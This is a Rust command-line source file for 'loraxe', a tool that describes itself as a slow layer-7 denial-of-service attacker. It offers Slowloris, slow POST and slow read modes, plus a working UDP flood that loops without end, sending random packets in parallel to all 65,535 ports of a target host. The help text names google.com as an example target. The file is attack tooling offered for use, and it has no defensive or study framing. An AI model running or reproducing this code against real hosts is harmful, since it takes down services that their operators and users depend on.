extern crate pretty_env_logger;
extern crate structopt;
extern crate rayon;
#[macro_use] extern crate log;

use rayon::prelude::*;
use std::net::{UdpSocket, SocketAddr, ToSocketAddrs};
use structopt::StructOpt;
use std::time::Duration;
use rand::Rng;
use std::env;
use std::error::Error;

// /// Verbosity level
// static LOG_LEVEL: usize = 0;
use loraxe::*;


/// A low bandwidth slow layer-7 dos tool
#[derive(StructOpt, Debug)]
#[structopt(name = "loraxe")]
struct Opt {
    // A flag, true if used in the command line. Note doc comment will
    // be used for the help message of the flag.
    /// Activate ssl mode (HTTPS)
    #[structopt(long = "ssl")]
    ssl: bool,

    /// Activate HTTP post mode
    #[structopt(long = "post")]
    post: bool,

    /// How long to wait in between packets
    #[structopt(long = "delay", short = "d", default_value = "15")]
    delay: u64,

    /// Use a random user-agent 
    #[structopt(short = "r", long = "rand-user-agent")]
    rand_ua: bool,

    /// Enable UDP flood mode
    #[structopt(long = "flood", short = "f")]
    flood: bool,

    /// Set number of conncurent sockets
    #[structopt(short = "s", long = "sockets", default_value = "150")]
    sockets: usize,

    /// Connection timeout in seconds
    #[structopt(short = "t", long = "timeout", default_value = "10")]
    sockets_delay: u64,

    #[structopt(short = "b", long = "buffer", default_value = "32")]
    /// Set read-buffer size for HTTP Read mode
    read_size: usize,

    #[structopt(long = "read")]
    /// Activate Slow HTTP Read mode
    read: bool,

    /// Set port to attack
    #[structopt(short = "p", long = "port", default_value = "80")]
    port: u16,

    /// IP Adress or Hostname to attack (i.e "google.com", "192.168.0.1")
    #[structopt(name = "IP")]
    ip: String,
}


fn main() -> Result<(), Box<dyn Error>> {


    let opt = Opt::from_args();

    //Set the `RUST_LOG` var if none is provided
    if env::var("RUST_LOG").is_err() {
        env::set_var("RUST_LOG", "loraxe=INFO");
    }

    pretty_env_logger::init_timed();


    // Calling .unwrap() is safe here because "INPUT" is required (if "INPUT" wasn't
    // required we could have used an 'if let' to conditionally get the value)
    // println!("Using input file: {}", matches.value_of("INPUT").unwrap());

    // Vary the output based on how many times the user used the "verbose" flag
    // (i.e. 'myprog -v -v -v' or 'myprog -vvv' vs 'myprog -v'
    // match matches.occurrences_of("v") {
    //     0 => println!("No verbose info"),
    //     1 => println!("Some verbose info"),
    //     2 => println!("Tons of verbose info"),
    //     3 | _ => println!("Don't be crazy"),
    // }

    let dos_type = if opt.post { DOSType::SlowPost } else if opt.read { DOSType::SlowRead } else { DOSType::SlowLoris};


    let ip: &str = &opt.ip.clone();

    if !opt.flood {

        // TODO Create config from CLI arguments using Clap
        let config = Config {
            sock_timeout: Duration::from_secs(opt.sockets_delay),
            https: opt.ssl,
            addr: opt.ip,
            port: opt.port,
            rand_ua: opt.rand_ua,
            socket_count: opt.sockets,
            dos_type,
            delay: opt.delay,
            read_size: opt.read_size
        };


        let mut loraxe = Loraxe::new(config);

        // Create initial sockets
        loraxe.create_sockets()?;

        // Start dos
        loraxe.attack()?;

    } else {
        // UDP Flood mode
        info!("Starting UDP Flood on {}", &ip);

        let mut rng = rand::thread_rng();

        let bytes = (0..1024).into_iter().map(|_| {
            rng.gen::<u8>()
        }).collect::<Vec<u8>>();


        let sock = UdpSocket::bind("0.0.0.0:1337").expect("Couldn't bind to address");

        loop {
            println!("Sending packet");

            (0..65535).into_par_iter().for_each(|i: i32|{
                let mut url = String::with_capacity(ip.len() + i.to_string().len() + 1);

                url.push_str(&ip);
                url.push_str(":");
                url.push_str(&i.to_string());

                let sock_addr: SocketAddr = url.to_socket_addrs().unwrap().collect::<Vec<SocketAddr>>()[0];

                debug!("Sending Packet to port {}", i);

                sock.send_to(&bytes, sock_addr).unwrap_or_else(|e| {
                    warn!("Connection failed: {}", e);
                    0
                });
            })
        }
    }


    Ok(())
}


// /// Logs a function at given level
// fn log(log: &str, level: usize){
//     if LOG_LEVEL >= level {
//         println!("{}", log);
//     }

// }
